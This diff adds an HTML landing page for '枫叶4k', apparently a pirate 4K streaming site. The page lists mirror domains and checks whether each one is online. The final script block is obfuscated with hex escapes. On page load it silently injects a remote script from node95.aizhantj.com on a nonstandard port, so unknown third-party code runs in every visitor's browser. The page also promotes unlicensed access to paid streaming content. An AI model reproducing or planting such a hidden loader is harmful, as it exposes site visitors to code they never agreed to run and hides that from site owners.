@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>枫叶4k</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="applicable-device" content="pc,mobile">
+    <style>
+        *,
+        ::before,
+        ::after {
+            box-sizing: border-box;
+            border-width: 0;
+            border-style: solid;
+            border-color: #e5e7eb;
+        }
+        html {
+            line-height: 1.5;
+            -webkit-text-size-adjust: 100%;
+            font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+        }
+        body {
+            margin: 0;
+            line-height: inherit;
+        }
+        a {
+            color: inherit;
+            text-decoration: inherit;
+        }
+        .container {
+            width: 100%;
+            max-width: 56rem;
+            margin-left: auto;
+            margin-right: auto;
+            padding-left: 1rem;
+            padding-right: 1rem;
+        }
+        @media (min-width: 640px) {
+            .container { padding-left: 1.5rem; padding-right: 1.5rem; }
+        }
+        .domain-list {
+            display: flex;
+            flex-direction: column;
+            gap: 1.5rem;
+            max-width: 42rem;
+            margin-left: auto;
+            margin-right: auto;
+            margin-bottom: 3rem;
+        }
+        .domain-card {
+            background-color: #fff;
+            border-radius: 0.5rem;
+            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+            border: 1px solid #e5e7eb;
+            transition: all 0.3s ease;
+            transform: translateY(0);
+        }
+        .domain-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
+        }
+        .card-inner {
+            padding: 1.5rem;
+        }
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 0.75rem;
+        }
+        .domain-title {
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: #1f2937;
+        }
+        .domain-title1 {
+            font-size: 1.05rem;
+            font-weight: 600;
+            color: #021836;
+        }
+        .domain-desc {
+            color: #6b7280;
+            font-size: 0.875rem;
+            margin-top: 0.25rem;
+        }
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            padding: 0.25rem 0.75rem;
+            border-radius: 9999px;
+            font-size: 0.875rem;
+            font-weight: 500;
+            white-space: nowrap;
+        }
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 6px;
+        }
+        .status-checking {
+            background: #f59e0b;
+            animation: pulse 2s infinite;
+        }
+        .status-online { background: #10b981; }
+        .status-offline { background: #ef4444; }
+        .badge-online {
+            background-color: #dcfce7;
+            color: #166534;
+        }
+        .badge-offline {
+            background-color: #fee2e2;
+            color: #b91c1c;
+        }
+        .badge-checking {
+            background-color: #f3f4f6;
+            color: #4b5563;
+        }
+        .badge-static {
+            background-color: #e0e7ff;
+            color: #3730a3;
+        }
+        .visit-btn {
+            display: block;
+            width: 100%;
+            background-color: #3b82f6;
+            color: white;
+            text-align: center;
+            font-weight: 500;
+            padding: 0.5rem 1rem;
+            border-radius: 0.375rem;
+            transition: background-color 0.2s;
+            margin-top: 1rem;
+        }
+        .visit-btn:hover {
+            background-color: #2563eb;
+        }
+        h1 {
+            font-size: 2.25rem;
+            font-weight: 700;
+            color: #1f2937;
+            text-align: center;
+            margin-bottom: 1rem;
+            margin-top: 4rem;
+        }
+        .update-time {
+            text-align: center;
+            color: #6b7280;
+            font-size: 1.125rem;
+            margin-bottom: 3rem;
+        }
+        footer {
+            text-align: center;
+            color: #9ca3af;
+            border-top: 1px solid #e5e7eb;
+            padding-top: 1.5rem;
+            margin-top: 1rem;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #eff6ff 0%, #eef2ff 50%, #faf5ff 100%);
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>枫叶4k 最新地址</h1>
+    <p class="update-time">更新时间：2026-10-03</p>
+    <div id="domain-list" class="domain-list"></div>
+    <div class="domain-list">
+        <div class="domain-card">
+            <div class="card-inner">
+                <div class="card-header">
+                    <div>
+                        <div class="domain-title1">🌈 4K画质,畅享鹅酷芒桃svip</div>
+                        <div class="domain-title1">🚀 多线路,秒加载,支持超前点播</div>
+                       <!-- <div class="domain-desc">🚀多线路,高清不卡,秒加载,支持超前点播</div>-->
+                    </div>
+                    <div class="status-badge badge-static">
+                        <span class="status-text">牢记</span>
+                    </div>
+                </div>
+                <a href="https://www.vip1949.com" target="_blank" rel="noopener noreferrer" class="visit-btn">
+                    枫叶4K发布页：vip1949.com
+                </a>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <p>vip1949.com - 2019-2026</p>
+    </footer>
+</div>
+
+<script>
+    const domains = [
+        {
+            name: "zzztool.com",
+            url: "https://www.zzztool.com/",
+            description: "主要域名"
+        },
+        {
+            name: "cadkssb.com",
+            url: "https://www.cadkssb.com/",
+            description: "备用域名"
+        }
+    ];
+    async function checkDomain(url, timeout = 5000) {
+        const controller = new AbortController();
+        const tid = setTimeout(() => controller.abort(), timeout);
+        try {
+            await fetch(url, {
+                method: 'HEAD',
+                mode: 'no-cors',
+                signal: controller.signal,
+                cache: 'no-store'
+            });
+            clearTimeout(tid);
+            return true;
+        } catch {
+            clearTimeout(tid);
+            return false;
+        }
+    }
+    function createCardHTML(domain, index) {
+        const safeName = escapeHtml(domain.name);
+        const safeUrl = escapeHtml(domain.url);
+        const safeDesc = escapeHtml(domain.description || '');
+        return `
+            <div class="domain-card" data-index="${index}">
+                <div class="card-inner">
+                    <div class="card-header">
+                        <div>
+                            <div class="domain-title">${safeName}</div>
+                            <div class="domain-desc">${safeDesc}</div>
+                        </div>
+                        <div class="status-badge badge-checking">
+                            <span class="status-dot status-checking"></span>
+                            <span class="status-text">检测中...</span>
+                        </div>
+                    </div>
+                    <a href="${safeUrl}" target="_blank" rel="noopener noreferrer" class="visit-btn">
+                        访问网站
+                    </a>
+                </div>
+            </div>
+        `;
+    }
+    function updateCardStatus(index, isOnline) {
+        const card = document.querySelector(`.domain-card[data-index="${index}"]`);
+        if (!card) return;
+        const badge = card.querySelector('.status-badge');
+        const dot = badge.querySelector('.status-dot');
+        const textSpan = badge.querySelector('.status-text');
+        if (!badge || !dot || !textSpan) return;
+
+        dot.classList.remove('status-checking', 'status-online', 'status-offline');
+        badge.classList.remove('badge-checking', 'badge-online', 'badge-offline');
+
+        if (isOnline === true) {
+            dot.classList.add('status-online');
+            textSpan.innerText = '在线';
+            badge.classList.add('badge-online');
+        } else if (isOnline === false) {
+            dot.classList.add('status-offline');
+            textSpan.innerText = '离线';
+            badge.classList.add('badge-offline');
+        } else {
+            dot.classList.add('status-checking');
+            textSpan.innerText = '检测中...';
+            badge.classList.add('badge-checking');
+        }
+    }
+    function escapeHtml(str) {
+        if (!str) return '';
+        return str.replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        });
+    }
+    async function init() {
+        const container = document.getElementById('domain-list');
+        if (!container) return;
+        container.innerHTML = '';
+        domains.forEach((domain, idx) => {
+            container.insertAdjacentHTML('beforeend', createCardHTML(domain, idx));
+        });
+        const promises = domains.map(async (domain, idx) => {
+            const online = await checkDomain(domain.url);
+            updateCardStatus(idx, online);
+        });
+        await Promise.all(promises);
+    }
+    window.addEventListener('DOMContentLoaded', init);
+</script>
+<script> var rfAI1 = rfAI1 || []; (function () { var X$Ij2 = window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74"]("\x73\x63\x72\x69\x70\x74"); X$Ij2["\x73\x72\x63"] = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x6f\x64\x65\x39\x35\x2e\x61\x69\x7a\x68\x61\x6e\x74\x6a\x2e\x63\x6f\x6d\x3a\x32\x31\x32\x33\x33\x2f\x74\x6a\x6a\x73\x2f\x3f\x6b\x3d\x38\x73\x35\x77\x7a\x67\x6b\x6b\x6f\x78\x74"; var V3 = window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x73\x42\x79\x54\x61\x67\x4e\x61\x6d\x65"]("\x73\x63\x72\x69\x70\x74")[0]; V3["\x70\x61\x72\x65\x6e\x74\x4e\x6f\x64\x65"]["\x69\x6e\x73\x65\x72\x74\x42\x65\x66\x6f\x72\x65"](X$Ij2, V3); })(); </script> 
+</body>
+</html>
